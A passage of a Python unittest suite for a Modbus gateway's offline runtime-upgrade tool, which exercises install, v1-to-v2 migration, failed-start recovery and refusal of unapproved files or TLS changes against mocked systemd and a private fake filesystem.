"""Production file lifecycle in private Linux directories; no real service/SHM."""
import copy
import importlib.util
import json
import hashlib
import os
import shutil
import struct
import subprocess
import time
import types
import tarfile
import io
from pathlib import Path
import tempfile
import unittest
from unittest import mock

REPO = Path(__file__).resolve().parents[1]


def load():
    spec = importlib.util.spec_from_file_location('production_offline_test', REPO / 'deploy/offline-runtime-upgrade.py')
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@unittest.skipUnless(os.geteuid() == 0, 'root-owned private lifecycle fixture required')
class ProductionRuntimeTest(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix='production-runtime-')
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.m = load()
        self.g = self.m.guard
        def mapped(*parts):
            path = Path(*parts)
            if path.is_absolute() and path.parts[1] in ('opt', 'etc', 'proc', 'dev', 'run'):
                return self.root / 'system' / str(path).lstrip('/')
            return path
        self.path = mapped
        self.patch(self.m, 'Path', mapped)
        self.patch(self.g, 'Path', mapped)
        self.g.SYSTEMD_ROOTS = ('/etc/systemd/system',)
        self.patch(self.m.os, 'uname', lambda: types.SimpleNamespace(machine='aarch64'))
        self.patch(self.m.time, 'sleep', lambda seconds: None)
        self.home = mapped('/opt/modbus-gateway')
        self.payload = self.root / 'payload'
        stage = self.root / 'staged-entry'
        for name in self.g.PRODUCTION_HELPERS | {'gateway-ota-recover.service'}:
            self.write(stage / name, (REPO / 'deploy' / name).read_bytes(),
                       0o644 if name.endswith('.service') else 0o755)
        self.m.__file__ = str(stage / 'offline-runtime-upgrade.py')
        self.units = ['gateway-services.service', self.g.MONITOR_UNIT,
                      'system-monitor@.service', 'can-driver@.service', 'ky-ems.service']
        self.allowed = ['gateway-services.service', self.g.MONITOR_UNIT]
        self.calls = []
        self.pid = '98765'
        self.live = set(self.allowed)
        self.fail_start = False
        self.fail_health = False
        self.write(mapped('/proc/sys/kernel/random/boot_id'), 'LOCAL_BOOT\n')
        self.write(mapped('/proc/meminfo'), 'MemAvailable: 2097152 kB\n')
        self.write(mapped('/proc') / str(os.getpid()) / 'stat', Path('/proc') .joinpath(str(os.getpid()), 'stat').read_bytes())
        self.write(mapped('/proc') / str(os.getpid()) / 'maps', b'')
        (mapped('/proc') / str(os.getpid()) / 'fd').mkdir(mode=0o700)
        self.write(mapped('/run/gateway-offline-runtime.lock'), b'', 0o600)
        self.write(mapped('/etc/modbus-gateway/ota.pub'), 'PRIVATE FIXTURE PUBLIC KEY PLACEHOLDER\n')
        self.write(self.home / 'config/runtime/device_identity.json', '{"machineCode":"FLEET_NODE_NOT_CORE"}\n')
        self.write(self.home / 'config/runtime/apps/monitor-service.json', '{"sharedMemoryName":"live_v11"}\n')
        self.write(self.home / 'data/runtime-upgrade-stop', 'HISTORICAL_R2\n', 0o600)
        self.write(mapped('/dev/shm/live_v11'), struct.pack('<II', 0x4d505354, 11))
        with mapped('/dev/shm/live_v11').open('r+b') as stream:
            stream.truncate(self.g.POINT_STORE_SIZES[11])
        self.write(mapped('/dev/shm/retired_v10'), struct.pack('<II', 0x4d505354, 10))
        for name in self.g.PRODUCTION_HELPERS:
            source = REPO / 'deploy' / name
            self.write(self.payload / 'bin' / name, source.read_bytes(), 0o755)
            self.write(self.home / 'bin' / name, b'old paired ' + name.encode(), 0o755)
        self.write(self.home / 'bin/SystemMonitor', self.elf(b'old-monitor'), 0o755)
        self.write(self.payload / 'bin/SystemMonitor', self.elf(b'new-monitor'), 0o755)
        self.write(self.home / 'ky-ems/plugins/platforms/libqeglfs.so', self.elf(b'preserved-qt'), 0o644)
        self.write(self.payload / 'ky-ems/plugins/platforms/libqeglfs.so', self.elf(b'preserved-qt'), 0o644)
        gates = {}
        for unit in self.units:
            name = unit.split('@')[0] + '@.service' if '@' in unit else unit
            self.write(mapped('/etc/systemd/system') / name, '[Service]\nExecStart=/fixture/never-executed\n', 0o644)
            path = mapped('/etc/systemd/system') / (unit + '.d/90-offline-HISTORICAL_R2.conf')
            self.write(path, 'historical pinned gate ' + unit, 0o644)
            gates[unit] = str(path)
        self.write(mapped('/etc/systemd/system/gateway-ota-recover.service'), '[Service]\nType=oneshot\n', 0o644)
        historical = self.root / 'historical'
        for name in ('state.json', 'approval.json', 'activation-ready.json'):
            self.write(historical / name, '{}\n', 0o600)
        self.write(historical / 'state.json', json.dumps({'segments': [{'source': 'retired_v10', 'target': 'live_v11'}]}) + '\n', 0o600)
        self.write(historical / 'approval.json', json.dumps({'units': self.units}) + '\n', 0o600)
        self.write(historical / 'verifier.py', '# private legacy verifier substitute\n', 0o600)
        active = {'stateDir': str(historical), 'stateSha256': self.m.digest(historical / 'state.json'),
                  'approvalSha256': self.m.digest(historical / 'approval.json'),
                  'readySha256': self.m.digest(historical / 'activation-ready.json'), 'allowedUnits': self.allowed}
        self.write(self.home / 'data' / self.g.ACTIVATION_FILE, json.dumps(active), 0o600)
        retired = mapped('/dev/shm/retired_v10').stat()
        segment = mapped('/dev/shm/live_v11').stat()
        self.previous = dict(format='runtime-baseline-v1', baselineId='LEGACY_SNAPSHOT', generation=1,
            parentSha256=None, gatewayHome=str(self.home), machineCode='FLEET_NODE_NOT_CORE', architecture='aarch64',
            pointStoreAbi=11, pointStoreSize=self.g.POINT_STORE_SIZES[11], clusterProtocol=2, controlEnabled=False,
            files=self.g.production_files(self.home), configSha256=self.m.tree_hashes(self.home / 'config/runtime'),
            units=self.units, allowedUnits=self.allowed, unitFiles=self.g.production_unit_files(self.units), gates=gates,
            segments=[dict(name='live_v11', dev=segment.st_dev, ino=segment.st_ino)],
            retiredSources={'retired_v10': dict(dev=retired.st_dev, ino=retired.st_ino)},
            historical={str(p): self.g.production_pin(p) for p in historical.iterdir()}, bootId='LOCAL_BOOT',
            release='old', trust=dict(requireSignature=True, checksumRequired=True, allowInsecureHttp=False,
                publicKeySha256=self.m.digest(mapped('/etc/modbus-gateway/ota.pub')), httpsOrigins=['https://fixture.invalid']),
            healthPolicy=dict(stableSeconds=2, url='http://127.0.0.1:8080/health', timeoutSeconds=3))
        for p in (self.home / 'data/runtime-upgrade-stop', self.home / 'data' / self.g.ACTIVATION_FILE):
            self.previous['historical'][str(p)] = self.g.production_pin(p)
        self.candidate = copy.deepcopy(self.previous)
        self.candidate.update(baselineId='B0', release='bootstrap', files=self.g.production_files(self.payload))
        self.candidate['unitFiles'][str(mapped('/etc/systemd/system/gateway-ota-recover.service'))] = self.g.production_pin(stage / 'gateway-ota-recover.service')
        for unit, path in gates.items():
            body = self.m.production_gate(self.home, unit)
            self.candidate['unitFiles'][path] = dict(sha256=hashlib.sha256(body).hexdigest(), mode=0o644, bytes=len(body))
        self.approval = dict(format='runtime-provisioning-v1', transaction='ADOPT_01', operation='adopt',
            expiresAtUnix=int(time.time()) + 600, gatewayHome=str(self.home), machineCode='FLEET_NODE_NOT_CORE',
            parentSha256=None, previous=self.previous, candidate=self.candidate,
            legacy=dict(verifierPath=str(historical / 'verifier.py'), verifierSha256=self.m.digest(historical / 'verifier.py'),
                activeSha256=self.m.digest(self.home / 'data' / self.g.ACTIVATION_FILE),
                stateSha256=active['stateSha256'], approvalSha256=active['approvalSha256'], readySha256=active['readySha256']))
        self.runtime = self.m.ProductionRuntime(self.home)
        self.patch(self.m, 'systemctl', self.systemctl)
        self.patch(self.g, 'systemctl_value', self.property)
        self.patch(self.m.subprocess, 'run', self.external)
        self.make_process()
        self.original_inode = segment.st_ino

    def patch(self, *args, **kwargs):
        patcher = mock.patch.object(*args, **kwargs)
        result = patcher.start()
        self.addCleanup(patcher.stop)
        return result

    def write(self, path, content, mode=0o644):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(content.encode() if isinstance(content, str) else content)
        path.chmod(mode)

    def elf(self, payload):
        header = bytearray(64)
        header[:6] = b'\x7fELF\x02\x01'
        struct.pack_into('<HH', header, 16, 2, 183)
        return bytes(header) + payload

    def make_process(self):
        proc = self.path('/proc') / self.pid
        proc.mkdir(parents=True, exist_ok=True)
        if (proc / 'exe').is_symlink():
            (proc / 'exe').unlink()
        (proc / 'exe').symlink_to(self.home / 'bin/SystemMonitor')
        s = self.path('/dev/shm/live_v11').stat()
        self.write(proc / 'maps', '1000-2000 rw-s 00000000 %02x:%02x %d /dev/shm/live_v11\n' %
                   (os.major(s.st_dev), os.minor(s.st_dev), s.st_ino))
        self.write(proc / 'stat', self.pid + ' (private-fixture) ' + ' '.join(['0'] * 19 + ['12345']))
        (proc / 'fd').mkdir(mode=0o700, exist_ok=True)

    def property(self, unit, prop):
        if prop == 'ActiveState': return 'active' if unit in self.live else 'inactive'
        if prop == 'SubState': return 'running' if unit in self.live else 'dead'
        if prop == 'MainPID': return self.pid if unit == self.g.MONITOR_UNIT and unit in self.live else '0'
        if prop == 'NRestarts': return '0'
        if prop == 'LoadState': return 'loaded'
        if prop == 'NeedDaemonReload': return 'no'
        if prop == 'FragmentPath':
            fragment = unit.split('@')[0] + '@.service' if '@' in unit else unit
            return str(self.path('/etc/systemd/system') / fragment)
        if prop == 'DropInPaths':
            names = {unit + '.d'}
            if '@' in unit: names.add(unit.split('@')[0] + '@.service.d')
            return ' '.join(str(p) for p in self.path('/etc/systemd/system').rglob('*.conf') if p.parent.name in names)
        raise AssertionError('unexpected systemd property: ' + prop)

    def systemctl(self, *args):
        self.calls.append(args)
        if args[0] == 'stop':
            self.live.difference_update(args[1:])
            proc = self.path('/proc') / self.pid
            if proc.exists(): shutil.rmtree(proc)
            return ''
        if args[0] == 'show':
            if len(args) == 4 and args[1:3] == ('--property=ActiveState', '--value') and args[3] in self.units:
                return self.property(args[3], 'ActiveState')
            if len(args) >= 3 and args[1] == '--property=Id,ActiveState,MainPID' and all(u in self.units for u in args[2:]):
                return '\n\n'.join('Id=%s\nActiveState=%s\nMainPID=%s' %
                        (u, self.property(u, 'ActiveState'), self.property(u, 'MainPID')) for u in args[2:])
            raise AssertionError('unexpected fixture show grammar: ' + str(args))
        if args[0] == 'start':
            if self.fail_start: raise ValueError('injected start failure')
            self.live.add(args[1])
            if args[1] == self.g.MONITOR_UNIT: self.make_process()
            return ''
        if args[0] in ('daemon-reload', 'is-active'): return ''
        raise AssertionError('unexpected service action: ' + str(args))

    def external(self, command, **kwargs):
        self.calls.append(tuple(command))
        if command[0] == '/usr/bin/systemd-run':
            self.assertIn('--no-block', command)
            self.assertIn('--property=After=gateway-ota-recover.service', command)
            self.assertEqual(command[-2:], ['production-boot-finish', str(self.home)])
            return subprocess.CompletedProcess(command, 0, b'', b'')
        if command[:2] == ['systemctl', 'list-units'] or command[:2] == ['systemctl', 'list-unit-files']:
            return subprocess.CompletedProcess(command, 0, '\n'.join(u + ' loaded' for u in self.units), '')
        if command[0] == '/usr/bin/python3' and 'activated-unit' in command:
            return subprocess.CompletedProcess(command, 0, b'private legacy proof substitute', b'')
        if command[0] == '/usr/bin/curl':
            self.assertEqual(command[:2], ['/usr/bin/curl', '--disable'])
            self.assertEqual(command[-2:], ['--', 'http://127.0.0.1:8080/health'])
            self.assertEqual(kwargs['env'], {'PATH': '/usr/bin:/bin', 'LC_ALL': 'C'})
            return subprocess.CompletedProcess(command, 1 if self.fail_health else 0, b'', b'')
        raise AssertionError('unexpected external command: ' + str(command))

    def args(self):
        approval = self.root / (self.approval['transaction'] + '.json')
        self.write(approval, json.dumps(self.approval) + '\n', 0o600)
        return types.SimpleNamespace(approval=approval, approval_sha256=self.m.digest(approval), payload=self.payload)

    def adopt(self):
        args = self.args()
        with self.m.production_lock():
            tx = self.m.production_adopt(args)
        return tx, args

    def next_release(self):
        previous = self.g.production_context(self.home)
        pointer = self.g.production_json(self.runtime.root / 'current.json')
        self.write(self.payload / 'bin/SystemMonitor', self.elf(b'really-different-release'), 0o755)
        candidate = copy.deepcopy(previous)
        candidate.update(baselineId='B1', generation=2, parentSha256=pointer['sha256'], release='1.1',
                         files=self.g.production_files(self.payload))
        self.approval.update(transaction='INSTALL_02', operation='install', previous=previous,
                             candidate=candidate, parentSha256=pointer['sha256'], legacy=None)
        return self.args()

    def v2_code_only_release(self, with_old_logic=True, adopt_first=True, with_tls=False):
        if adopt_first:
            self.adopt()
        previous = copy.deepcopy(self.g.production_context(self.home))
        identity = '/opt/modbus-gateway/config/runtime/device_identity.json'
        self.write(self.home / 'config/runtime/apps/mqtt-service.json',
                   json.dumps({'identityConfigFile': identity}) + '\n')
        self.write(self.home / 'config/runtime/apps/monitor-service.json',
                   json.dumps({'identityConfigFile': identity,
                               'mqttDriver': {'sharedMemoryName': 'live_v11'},
                               'systemMonitor': {'enabled': True}}) + '\n')
        if with_old_logic:
            self.write(self.home / 'config/runtime/logic/retired.json', '{"enabled":false}\n')
        if with_tls:
            self.write(self.home / 'config/runtime/tls/ca.crt', b'PRIVATE FIXTURE CA V1\n', 0o600)
        for name in ('system-monitor@.service', 'gateway-services.service'):
            self.write(self.path('/etc/systemd/system') / name,
                       (REPO / 'deploy' / name).read_bytes())
        parser = (REPO / 'deploy/production_role_policy.py').read_bytes()
        self.write(self.home / 'bin/production_role_policy.py', parser + b'\n# previous pinned revision\n', 0o755)
        previous.update(format='runtime-baseline-v2', baselineId='V2_START',
                        files=self.g.production_files(self.home),
                        configSha256=self.m.tree_hashes(self.home / 'config/runtime'),
                        unitFiles=self.g.production_unit_files(self.units))
        protected = {'machineCode': previous['machineCode'],
                     'identitySha256': previous['configSha256']['device_identity.json'],
                     'networkSha256': {},
                     'tlsSha256': ({'tls/ca.crt': previous['configSha256']['tls/ca.crt']}
                                   if with_tls else {}),
                     'otaPublicKeySha256': previous['trust']['publicKeySha256'],
                     'monitorShmName': 'live_v11'}
        policy = {'__name__': 'private_v2_policy'}
        exec(compile(parser, str(REPO / 'deploy/production_role_policy.py'), 'exec'), policy)
        resolved = policy['resolve'](self.home / 'config/runtime',
                    self.path('/etc/systemd/system'), protected,
                    self.path('/etc/modbus-gateway/ota.pub'))
        previous['allowedUnits'] = [role['unit'] for role in resolved['roles']]
        profile = {'format': 'board-simulator-profile-v1',
                   'machineCode': previous['machineCode'], 'ramMiB': 2048,
                   'capabilities': [], 'simulatorBindings': {},
                   'allowedUnits': previous['allowedUnits'],
                   'segmentNames': ['live_v11']}
        raw = (json.dumps(profile, sort_keys=True) + '\n').encode()
        profile_sha = hashlib.sha256(raw).hexdigest()
        self.write(self.runtime.root / 'profiles' / (profile_sha + '.json'), raw, 0o600)
        previous['roleAuthority'] = {'format': 'configured-role-authority-v2',
                                     'profileSha256': profile_sha, 'resolved': resolved}
        record = self.runtime.root / 'baselines/V2_START.json'
        self.write(record, json.dumps(previous, sort_keys=True) + '\n', 0o444)
        record_sha = self.m.digest(record)
        setup = self.runtime.root / 'transactions/V2_SETUP/health.json'
        self.write(setup, json.dumps({'status': 'healthy', 'baselineSha256': record_sha}) + '\n', 0o600)
        setup_approval = setup.parent / 'approval.json'
        self.write(setup_approval, json.dumps({'format': 'runtime-provisioning-v2',
                   'transaction': 'V2_SETUP', 'gatewayHome': str(self.home),
                   'previous': previous, 'candidate': previous,
                   'configWriteSet': []}) + '\n', 0o600)
        self.write(setup.parent / 'state.json',
                   json.dumps({'approvalSha256': self.m.digest(setup_approval),
                               'phase': 'COMPLETED'}) + '\n', 0o600)
        self.write(self.runtime.root / 'current.json', json.dumps({
            'baselineId': 'V2_START', 'sha256': record_sha,
            'healthSha256': self.m.digest(setup), 'transaction': 'V2_SETUP'}) + '\n', 0o600)
        self.g.production_verify(self.home, previous)
        self.write(self.payload / 'bin/SystemMonitor', self.elf(b'v2-code-only-release'), 0o755)
        candidate = copy.deepcopy(previous)
        candidate.update(baselineId='V2_NEXT', generation=previous['generation'] + 1,
                         parentSha256=record_sha, release='v2-code-only',
                         files=self.g.production_files(self.payload))
        self.approval = {'format': 'runtime-provisioning-v2', 'transaction': 'V2_CODE_ONLY',
                         'operation': 'install', 'expiresAtUnix': int(time.time()) + 600,
                         'gatewayHome': str(self.home), 'machineCode': previous['machineCode'],
                         'parentSha256': record_sha, 'previous': previous,
                         'candidate': candidate, 'legacy': None, 'configWriteSet': []}
        return self.args(), previous

    def v1_to_v2_release(self, legacy_without_parser=False, legacy_tls=False):
        parser_relative = 'bin/production_role_policy.py'
        if legacy_without_parser:
            (self.home / parser_relative).unlink()
            (self.payload / parser_relative).unlink()
            self.previous['files'].pop(parser_relative)
            self.candidate['files'].pop(parser_relative)
        if legacy_tls:
            old_tls = self.home / 'config/runtime/tls/ca.crt'
            self.write(old_tls, b'PRIVATE FIXTURE LEGACY CA\n', 0o600)
            old_pin = self.m.digest(old_tls)
            self.previous['configSha256']['tls/ca.crt'] = old_pin
            self.candidate['configSha256']['tls/ca.crt'] = old_pin
        for name in ('system-monitor@.service', 'gateway-services.service'):
            self.write(self.path('/etc/systemd/system') / name, (REPO / 'deploy' / name).read_bytes())
        self.previous['unitFiles'] = self.g.production_unit_files(self.units)
        self.candidate['unitFiles'] = copy.deepcopy(self.previous['unitFiles'])
        recovery_unit = str(self.path('/etc/systemd/system/gateway-ota-recover.service'))
        self.candidate['unitFiles'][recovery_unit] = self.g.production_pin(
            Path(self.m.__file__).with_name('gateway-ota-recover.service'))
        for unit, path in self.candidate['gates'].items():
            body = self.m.production_gate(self.home, unit)
            self.candidate['unitFiles'][path] = dict(
                sha256=hashlib.sha256(body).hexdigest(), mode=0o644, bytes=len(body))
        self.adopt()
        previous = copy.deepcopy(self.g.production_context(self.home))
        if legacy_without_parser:
            self.assertNotIn(parser_relative, previous['files'])
            self.assertFalse((self.home / parser_relative).exists())
            self.write(self.payload / parser_relative,
                       (REPO / 'deploy/production_role_policy.py').read_bytes(), 0o755)
        staged = self.payload / 'config/runtime'
        self.write(staged / 'device_identity.json',
                   (self.home / 'config/runtime/device_identity.json').read_bytes())
        if legacy_tls:
            self.write(staged / 'tls/ca.crt',
                       (self.home / 'config/runtime/tls/ca.crt').read_bytes(), 0o600)
        identity = '/opt/modbus-gateway/config/runtime/device_identity.json'
        self.write(staged / 'apps/mqtt-service.json',
                   json.dumps({'identityConfigFile': identity}) + '\n')
        self.write(staged / 'apps/monitor-service.json',
                   json.dumps({'identityConfigFile': identity,
                               'mqttDriver': {'sharedMemoryName': 'live_v11'},
                               'systemMonitor': {'enabled': True}}) + '\n')
        protected = {'machineCode': previous['machineCode'],
                     'identitySha256': previous['configSha256']['device_identity.json'],
                     'networkSha256': {},
                     'tlsSha256': ({'tls/ca.crt': previous['configSha256']['tls/ca.crt']}
                                   if legacy_tls else {}),
                     'otaPublicKeySha256': previous['trust']['publicKeySha256'],
                     'monitorShmName': 'live_v11'}
        parser = (REPO / 'deploy/production_role_policy.py').read_bytes()
        policy = {'__name__': 'private_v2_policy'}
        exec(compile(parser, str(REPO / 'deploy/production_role_policy.py'), 'exec'), policy)
        resolved = policy['resolve'](staged, self.path('/etc/systemd/system'), protected,
                                     self.path('/etc/modbus-gateway/ota.pub'))
        role_units = [role['unit'] for role in resolved['roles']]
        self.assertEqual(set(role_units), set(self.allowed))
        profile = {'format': 'board-simulator-profile-v1',
                   'machineCode': previous['machineCode'], 'ramMiB': 2048,
                   'capabilities': [], 'simulatorBindings': {},
                   'allowedUnits': role_units, 'segmentNames': ['live_v11']}
        raw = (json.dumps(profile, sort_keys=True) + '\n').encode()
        profile_sha = hashlib.sha256(raw).hexdigest()
        self.write(self.runtime.root / 'profiles' / (profile_sha + '.json'), raw, 0o600)
        candidate = copy.deepcopy(previous)
        candidate.update(format='runtime-baseline-v2', baselineId='V2_MIGRATED',
                         generation=previous['generation'] + 1,
                         parentSha256=self.g.production_json(self.runtime.root / 'current.json')['sha256'],
                         release='v2-migration', files=self.g.production_files(self.payload),
                         configSha256=self.m.tree_hashes(staged),
                         allowedUnits=role_units,
                         roleAuthority={'format': 'configured-role-authority-v2',
                                        'profileSha256': profile_sha, 'resolved': resolved})
        paths = sorted(path for path in set(previous['configSha256']) | set(candidate['configSha256'])
                       if previous['configSha256'].get(path) != candidate['configSha256'].get(path))
        changes = []
        for path in paths:
            before = self.g.production_pin(self.home / 'config/runtime' / path) if path in previous['configSha256'] else None
            after = self.g.production_pin(staged / path) if path in candidate['configSha256'] else None
            changes.append({'path': path, 'before': before, 'after': after})
        self.approval = {'format': 'runtime-provisioning-v2', 'transaction': 'V1_TO_V2',
                         'operation': 'install', 'expiresAtUnix': int(time.time()) + 600,
                         'gatewayHome': str(self.home), 'machineCode': previous['machineCode'],
                         'parentSha256': candidate['parentSha256'], 'previous': previous,
                         'candidate': candidate, 'legacy': None, 'configWriteSet': changes}
        self.payload.chmod(0o700)
        return self.args(), previous, candidate

    def test_v1_to_v2_formal_install_promotes_configured_authority(self):
        args, previous, candidate = self.v1_to_v2_release()
        self.assertEqual(previous['format'], 'runtime-baseline-v1')
        self.assertEqual(len(self.approval['configWriteSet']), 2)
        with self.m.production_lock():
            self.m.production_install(args)
        self.assertEqual(self.g.production_context(self.home), candidate)
        self.assertEqual(self.m.tree_hashes(self.home / 'config/runtime'), candidate['configSha256'])
        health = self.g.production_json(self.runtime.root / 'transactions/V1_TO_V2/health.json')
        self.assertEqual(health['format'], 'runtime-health-v2')
        self.assertEqual(set(health['roles']), set(candidate['allowedUnits']))

    def test_v1_to_v2_failed_start_restores_formal_v1_authority(self):
        args, previous, _ = self.v1_to_v2_release()
        old_config = self.m.tree_hashes(self.home / 'config/runtime')
        self.fail_start = True
        with self.assertRaisesRegex(ValueError, 'start failure'):
            with self.m.production_lock():
                self.m.production_install(args)
        tx = self.runtime.root / 'transactions/V1_TO_V2'
        self.assertTrue((self.home / 'config/runtime/apps/mqtt-service.json').is_file())
        self.fail_start = False
        with self.m.production_lock():
            self.assertEqual(self.runtime.recover(tx, args.approval_sha256), 'RECOVERED')
        self.assertEqual(self.g.production_context(self.home), previous)
        self.assertEqual(self.m.tree_hashes(self.home / 'config/runtime'), old_config)
        self.assertFalse((self.home / 'config/runtime/apps/mqtt-service.json').exists())

    def test_v1_to_v2_introduces_parser_missing_from_legacy_baseline(self):
        args, previous, candidate = self.v1_to_v2_release(legacy_without_parser=True)
        parser = self.home / 'bin/production_role_policy.py'
        self.assertNotIn('bin/production_role_policy.py', previous['files'])
        self.assertFalse(parser.exists())
        with self.m.production_lock():
            self.m.production_install(args)
        self.assertEqual(self.g.production_context(self.home), candidate)
        self.assertEqual(self.g.production_pin(parser),
                         candidate['files']['bin/production_role_policy.py'])

    def test_v1_to_v2_failed_start_removes_new_parser_on_recovery(self):
        args, previous, candidate = self.v1_to_v2_release(legacy_without_parser=True)
        parser = self.home / 'bin/production_role_policy.py'
        self.assertNotIn('bin/production_role_policy.py', previous['files'])
        self.fail_start = True
        with self.assertRaisesRegex(ValueError, 'start failure'):
            with self.m.production_lock():
                self.m.production_install(args)
        self.assertEqual(self.g.production_pin(parser),
                         candidate['files']['bin/production_role_policy.py'])
        self.fail_start = False
        tx = self.runtime.root / 'transactions/V1_TO_V2'
        with self.m.production_lock():
            self.assertEqual(self.runtime.recover(tx, args.approval_sha256), 'RECOVERED')
        self.assertFalse(parser.exists())
        self.assertEqual(self.g.production_files(self.home), previous['files'])
        self.assertEqual(self.g.production_context(self.home), previous)

    def test_v1_to_v2_ordinary_approval_preserves_legacy_tls_pin(self):
        _, previous, candidate = self.v1_to_v2_release(legacy_tls=True)
        staged = self.payload / 'config/runtime'
        tls = staged / 'tls/ca.crt'
        self.write(tls, b'PRIVATE FIXTURE UNAUTHORIZED CA\n', 0o600)
        candidate['configSha256'] = self.m.tree_hashes(staged)
        protected = copy.deepcopy(candidate['roleAuthority']['resolved']['protected'])
        protected['tlsSha256'] = {'tls/ca.crt': candidate['configSha256']['tls/ca.crt']}
        policy = {'__name__': 'private_v2_policy'}
        parser = (REPO / 'deploy/production_role_policy.py').read_bytes()
        exec(compile(parser, str(REPO / 'deploy/production_role_policy.py'), 'exec'), policy)
        candidate['roleAuthority']['resolved'] = policy['resolve'](
            staged, self.path('/etc/systemd/system'), protected,
            self.path('/etc/modbus-gateway/ota.pub'))
        self.approval['configWriteSet'].append({
            'path': 'tls/ca.crt',
            'before': self.g.production_pin(self.home / 'config/runtime/tls/ca.crt'),
            'after': self.g.production_pin(tls)})
        with self.assertRaisesRegex(ValueError, 'cannot rotate network/TLS trust'):
            with self.m.production_lock():
                self.m.production_install(self.args())
        self.assertFalse((self.runtime.root / 'transactions/V1_TO_V2').exists())
        self.assertEqual(self.g.production_context(self.home), previous)

    def test_v2_envelope_rejects_adoption_and_v1_candidate_before_intent(self):
        args, previous, _ = self.v1_to_v2_release()
        with self.assertRaisesRegex(ValueError, 'invalid/expired production approval'):
            with self.m.production_lock():
                self.m.production_adopt(args)
        self.assertFalse((self.runtime.root / 'transactions/V1_TO_V2').exists())
        self.approval['candidate']['format'] = 'runtime-baseline-v1'
        with self.assertRaisesRegex(ValueError, 'version mix invalid'):
            with self.m.production_lock():
                self.m.production_install(self.args())
        self.assertFalse((self.runtime.root / 'transactions/V1_TO_V2').exists())
        self.assertEqual(self.g.production_context(self.home), previous)

    def test_v2_code_only_changed_parser_recovers_previous_pinned_bytes(self):
        args, previous = self.v2_code_only_release()
        old_parser = (self.home / 'bin/production_role_policy.py').read_bytes()
        self.fail_start = True
        with self.assertRaisesRegex(ValueError, 'start failure'):
            with self.m.production_lock(): self.m.production_install(args)
        self.assertNotEqual((self.home / 'bin/production_role_policy.py').read_bytes(), old_parser)
        self.fail_start = False
        tx = self.runtime.root / 'transactions/V2_CODE_ONLY'
        with self.m.production_lock():
            self.assertEqual(self.runtime.recover(tx, args.approval_sha256), 'RECOVERED')
        self.assertEqual((self.home / 'bin/production_role_policy.py').read_bytes(), old_parser)
        self.assertEqual(self.g.production_context(self.home), previous)
        self.assertEqual(self.g.production_files(self.home), previous['files'])

    def test_v2_recovery_refuses_unapproved_third_parser_revision(self):
        args, _ = self.v2_code_only_release()
        self.fail_start = True
        with self.assertRaisesRegex(ValueError, 'start failure'):
            with self.m.production_lock(): self.m.production_install(args)
        parser = self.home / 'bin/production_role_policy.py'
        foreign = parser.read_bytes() + b'\n# foreign revision\n'
        self.write(parser, foreign, 0o755)
        self.fail_start = False
        tx = self.runtime.root / 'transactions/V2_CODE_ONLY'
        with self.assertRaisesRegex(ValueError, 'unowned production runtime file'):
            with self.m.production_lock(): self.runtime.recover(tx, args.approval_sha256)
        self.assertEqual(parser.read_bytes(), foreign)

    def test_v2_lineage_parent_sync_failure_recovery_and_next_transaction(self):
        args, previous = self.v2_code_only_release()
        lineage = self.runtime.root / 'boot-lineage'
        original_sync = self.m.sync_dir
        failed = False
        def fail_new_parent(path):
            nonlocal failed
            if path == self.runtime.root and lineage.is_dir() and not failed:
                failed = True
                raise OSError('injected lineage parent fsync failure')
            return original_sync(path)
        with mock.patch.object(self.m, 'sync_dir', fail_new_parent):
            with self.assertRaisesRegex(OSError, 'lineage parent fsync failure'):
                with self.m.production_lock():
                    self.m.production_install(args)
        self.assertTrue(failed)
        self.assertTrue(lineage.is_dir())
        self.assertFalse(any(lineage.iterdir()))
        transaction = self.runtime.root / 'transactions/V2_CODE_ONLY'
        with self.m.production_lock():
            self.assertEqual(self.runtime.recover(transaction, args.approval_sha256), 'RECOVERED')
        self.assertEqual(self.g.production_context(self.home), previous)

        self.approval['transaction'] = 'V2_RETRY'
        retry = self.args()
        original_promote = self.m.ProductionRuntime.promote
        original_publish = self.m.publish_new
        in_promote = False
        synced = False
        published = False
        def promote(runtime, *params):
            nonlocal in_promote
            in_promote = True
            return original_promote(runtime, *params)
        def sync_retained_parent(path):
            nonlocal synced
            if in_promote and path == self.runtime.root and lineage.is_dir():
                synced = True
            return original_sync(path)
        def publish(path, data, mode=0o600):
            nonlocal published
            if path.parent == lineage:
                self.assertTrue(synced, 'retained lineage parent must be synced before receipt')
                published = True
            return original_publish(path, data, mode)
        with mock.patch.object(self.m.ProductionRuntime, 'promote', promote), \
                mock.patch.object(self.m, 'sync_dir', sync_retained_parent), \
                mock.patch.object(self.m, 'publish_new', publish):
            with self.m.production_lock():
                self.m.production_install(retry)
        self.assertTrue(published)
        self.assertEqual(self.g.production_context(self.home), self.approval['candidate'])

    def test_v2_health_refuses_missing_required_role_mapping(self):
        _, previous = self.v2_code_only_release()
        self.write(self.path('/proc') / self.pid / 'maps', b'')
        with self.assertRaisesRegex(ValueError, 'required/optional SHM mismatch'):
            self.runtime.health(previous)

    def v2_config_release(self, without_logic_parent=False, with_tls=False, adopt_first=True):
        _, previous = self.v2_code_only_release(with_old_logic=not without_logic_parent,
                                                with_tls=with_tls, adopt_first=adopt_first)
        staged = self.payload / 'config/runtime'
        for source in (self.home / 'config/runtime').rglob('*'):
            if source.is_file():
                self.write(staged / source.relative_to(self.home / 'config/runtime'),
                           source.read_bytes(), source.stat().st_mode & 0o777)
        app = staged / 'apps/monitor-service.json'
        value = json.loads(app.read_text())
        value['runtimeMode'] = 'gateway'
        self.write(app, json.dumps(value, sort_keys=True) + '\n')
        self.write(staged / 'logic/new.json', '{"enabled":true}\n')
        retired = staged / 'logic/retired.json'
        if retired.exists():
            retired.unlink()
        candidate = self.approval['candidate']
        candidate.update(baselineId='V2_CONFIG', release='v2-config',
                         configSha256=self.m.tree_hashes(staged))
        policy = {'__name__': 'private_v2_policy'}
        source = (REPO / 'deploy/production_role_policy.py').read_bytes()
        exec(compile(source, str(REPO / 'deploy/production_role_policy.py'), 'exec'), policy)
        protected = previous['roleAuthority']['resolved']['protected']
        candidate['roleAuthority']['resolved'] = policy['resolve'](
            staged, self.path('/etc/systemd/system'), protected,
            self.path('/etc/modbus-gateway/ota.pub'))
        changes = []
        relatives = ['apps/monitor-service.json', 'logic/new.json']
        if not without_logic_parent:
            relatives.append('logic/retired.json')
        for relative in relatives:
